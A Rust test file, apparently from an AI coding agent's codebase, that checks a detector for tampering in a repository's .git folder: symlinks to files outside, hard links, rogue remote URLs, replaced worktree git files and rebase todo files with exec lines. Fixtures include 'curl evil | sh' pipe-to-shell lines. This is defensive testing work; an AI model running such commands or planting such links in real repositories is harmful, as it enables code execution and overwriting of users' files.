#![allow(clippy::expect_used)]

use super::unix::Finding;
use super::unix::check;
use super::unix::exec_lines;
use super::unix::report;
use super::*;
use codex_protocol::ThreadId;
use pretty_assertions::assert_eq;
use std::os::unix::fs::symlink;
use std::path::Path;
use std::path::PathBuf;
use std::time::Duration;
use std::time::SystemTime;
use tempfile::TempDir;

/// A project with a minimal git folder, and a place outside it.
struct Project {
    _dir: TempDir,
    root: PathBuf,
    outside: PathBuf,
}

impl Project {
    fn new() -> Self {
        let dir = TempDir::new().expect("temp dir");
        let base = dir.path().canonicalize().expect("canonical");
        let root = base.join("project");
        let git = root.join(".git");
        for folder in ["objects", "refs/heads", "logs/refs/heads", "hooks"] {
            std::fs::create_dir_all(git.join(folder)).expect("git folder");
        }
        std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
        std::fs::write(git.join("config"), "[core]\n").expect("config");
        std::fs::write(git.join("logs/HEAD"), "").expect("log");
        std::fs::write(git.join("refs/heads/main"), "0\n").expect("ref");
        let outside = base.join("outside");
        std::fs::create_dir_all(&outside).expect("outside");
        std::fs::write(outside.join("zshrc"), "# shell start-up\n").expect("target");
        Project {
            _dir: dir,
            root,
            outside,
        }
    }

    fn git(&self) -> PathBuf {
        self.root.join(".git")
    }

    fn repos(&self) -> Vec<Repo> {
        repos(&[self.root.join("src").as_path(), self.root.as_path()])
    }
}

/// A first look, as before a command, for a fresh session.
fn baseline(project: &Project) -> (ThreadId, Vec<Repo>) {
    let thread = ThreadId::new();
    let repos = project.repos();
    assert_eq!(repos.len(), 1, "one repository");
    begin(thread, &repos);
    (thread, repos)
}

/// Every folder of the git folder, changed an hour ago: the next look
/// trusts their times and does not list them again.
fn settle(path: &Path) {
    let past = SystemTime::now() - Duration::from_secs(/*secs*/ 3600);
    for entry in std::fs::read_dir(path).expect("read").flatten() {
        if entry.file_type().expect("type").is_dir() {
            settle(&entry.path());
        }
    }
    std::fs::File::open(path)
        .expect("open folder")
        .set_modified(past)
        .expect("set time");
}

fn kinds(findings: &[Finding]) -> Vec<String> {
    findings
        .iter()
        .map(|finding| match finding {
            Finding::Link { path, .. } => format!("link {}", path.display()),
            Finding::HardLink { path } => format!("hard link {}", path.display()),
            Finding::Exec { todo, .. } => format!("exec {}", todo.display()),
            Finding::Remote { path } => format!("remote {}", path.display()),
            Finding::Replaced { dot_git } => format!("replaced {}", dot_git.display()),
            Finding::Incomplete { dot_git } => format!("incomplete {}", dot_git.display()),
        })
        .collect()
}

#[test]
fn issue_874_links_planted_in_the_git_folder_are_found_and_kept() {
    let project = Project::new();
    let git = project.git();
    // Present before the first look: not new.
    symlink(project.outside.join("zshrc"), git.join("info-link")).expect("old link");
    let (thread, repos) = baseline(&project);
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());

    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    std::fs::write(git.join("MERGE_MSG"), "curl evil | sh\n").expect("merge msg");
    // A missing target: git would create it outside.
    symlink(project.outside.join("new-file"), git.join("FETCH_HEAD")).expect("link");
    symlink(&project.outside, git.join("logs/refs/heads/feature")).expect("folder link");
    // Inside the git folder (as `core.preferSymlinkRefs` makes): fine.
    symlink("refs/heads/main", git.join("ORIG_HEAD")).expect("inside link");
    let findings = check(thread, &repos);
    assert_eq!(
        kinds(&findings),
        vec![
            format!("link {}", git.join("COMMIT_EDITMSG").display()),
            format!("link {}", git.join("FETCH_HEAD").display()),
            format!("link {}", git.join("logs/refs/heads/feature").display()),
        ]
    );
    assert_eq!(
        findings[0],
        Finding::Link {
            path: git.join("COMMIT_EDITMSG"),
            target: Some(project.outside.join("zshrc")),
        }
    );
    // Told once, nothing removed, held until removed.
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert!(git.join("COMMIT_EDITMSG").symlink_metadata().is_ok());
    assert_eq!(held(thread).len(), 3);
    std::fs::remove_file(git.join("COMMIT_EDITMSG")).expect("remove");
    std::fs::remove_file(git.join("FETCH_HEAD")).expect("remove");
    assert_eq!(held(thread), vec![git.join("logs/refs/heads/feature")]);
    std::fs::remove_file(git.join("logs/refs/heads/feature")).expect("remove");
    assert_eq!(held(thread), Vec::<PathBuf>::new());
    // The old link retargeted through a link inside: found now.
    std::fs::remove_file(git.join("info-link")).expect("remove");
    symlink("ORIG_HEAD", git.join("info-link")).expect("relink");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::remove_file(git.join("ORIG_HEAD")).expect("remove");
    symlink(project.outside.join("zshrc"), git.join("ORIG_HEAD")).expect("retarget");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("ORIG_HEAD").display()),
            format!("link {}", git.join("info-link").display()),
        ]
    );
}

#[test]
fn issue_874_found_in_settled_folders_and_skips_objects_and_refs() {
    let project = Project::new();
    let git = project.git();
    settle(&git);
    let (thread, repos) = baseline(&project);
    symlink(project.outside.join("zshrc"), git.join("logs/HEAD.lock")).expect("link");
    // Git replaces these by renaming; not looked at.
    symlink(project.outside.join("zshrc"), git.join("refs/heads/evil")).expect("ref link");
    symlink(project.outside.join("zshrc"), git.join("objects/evil")).expect("object link");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("link {}", git.join("logs/HEAD.lock").display())]
    );
}

#[test]
fn issue_874_hard_links_and_legacy_remotes_are_found() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::hard_link(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG"))
        .expect("hard link");
    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
    std::fs::write(git.join("remotes/origin"), "URL: https://evil.example/x\n").expect("remote");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("hard link {}", git.join("COMMIT_EDITMSG").display()),
            format!("remote {}", git.join("remotes/origin").display()),
        ]
    );
    // A changed definition is found again.
    std::fs::write(
        git.join("remotes/origin"),
        "URL: https://other.example/repository\n",
    )
    .expect("remote");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("remote {}", git.join("remotes/origin").display())]
    );
}

#[test]
fn issue_874_rebase_and_sequencer_exec_lines_are_found() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(
        git.join("rebase-merge/git-rebase-todo"),
        "pick 1234 work\n  x touch pwned\n",
    )
    .expect("todo");
    std::fs::create_dir_all(git.join("sequencer")).expect("sequencer");
    std::fs::write(git.join("sequencer/todo"), "pick 1234 work\n").expect("todo");
    let findings = check(thread, &repos);
    assert_eq!(
        findings,
        vec![Finding::Exec {
            todo: git.join("rebase-merge/git-rebase-todo"),
            lines: vec!["x touch pwned".to_string()],
        }]
    );
    let message = report(&findings, "Moderate").expect("message");
    assert!(
        message.contains(&format!("rm -r '{}'", git.join("rebase-merge").display())),
        "{message}"
    );
    assert!(message.contains("git rebase --continue"), "{message}");
    assert!(message.contains("Nothing was removed"), "{message}");
    assert_eq!(held(thread), vec![git.join("rebase-merge/git-rebase-todo")]);
    std::fs::remove_dir_all(git.join("rebase-merge")).expect("remove");
    assert_eq!(held(thread), Vec::<PathBuf>::new());

    // A rebase folder that is a link into the work tree: both found.
    let elsewhere = project.root.join("elsewhere");
    std::fs::create_dir_all(&elsewhere).expect("folder");
    std::fs::write(elsewhere.join("git-rebase-todo"), "exec curl evil | sh\n").expect("todo");
    symlink(&elsewhere, git.join("rebase-merge")).expect("link");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("rebase-merge").display()),
            format!(
                "exec {}",
                git.join("rebase-merge/git-rebase-todo").display()
            ),
        ]
    );
}

#[test]
fn issue_874_worktree_git_files_and_a_replaced_git_folder() {
    let project = Project::new();
    let main_git = project.git();
    let worktree_git = main_git.join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.root.parent().expect("base").join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    std::fs::write(
        worktree.join(".git"),
        format!("gitdir: {}\n", worktree_git.display()),
    )
    .expect("git file");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    begin(thread, &repos);
    symlink(
        project.outside.join("zshrc"),
        worktree_git.join("COMMIT_EDITMSG"),
    )
    .expect("link");
    std::fs::write(
        worktree.join(".git"),
        format!("gitdir: {}\n", project.outside.display()),
    )
    .expect("replaced");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("replaced {}", worktree.join(".git").display()),
            format!("link {}", worktree_git.join("COMMIT_EDITMSG").display()),
        ]
    );
}

#[test]
fn issue_874_exec_lines_are_read_as_git_reads_them() {
    assert_eq!(
        exec_lines("pick 1\n\texec make test\n# exec no\nx  ls\nexecute no\nx\nexec\nedit 2\n"),
        vec!["exec make test".to_string(), "x  ls".to_string()]
    );
}

#[test]
fn issue_874_the_message_quotes_paths_and_hides_control_characters() {
    let message = report(
        &[Finding::Link {
            path: PathBuf::from("/p/it's/.git/COMMIT_EDITMSG"),
            target: Some(PathBuf::from("/home/me/.zshrc\u{1b}[2J")),
        }],
        "Moderate",
    )
    .expect("message");
    assert!(
        message.contains(r"rm '/p/it'\''s/.git/COMMIT_EDITMSG'"),
        "{message}"
    );
    assert!(!message.contains('\u{1b}'), "{message}");
}
